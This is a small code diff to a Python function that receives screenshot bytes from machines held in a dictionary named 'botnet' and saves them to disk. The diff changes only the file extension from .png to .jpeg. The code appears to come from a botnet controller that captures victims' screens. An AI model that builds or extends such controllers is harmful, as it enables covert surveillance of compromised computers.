@@ -123,7 +123,7 @@ def get_screenshot(addr):
     image = botnet[addr].recv(int(size))
     check_container(addr)
     #os.chdir(addr)
-    file = open("scrnshot.png",'wb')
+    file = open("scrnshot.jpeg",'wb')
     file.write(image)
     file.close()
 
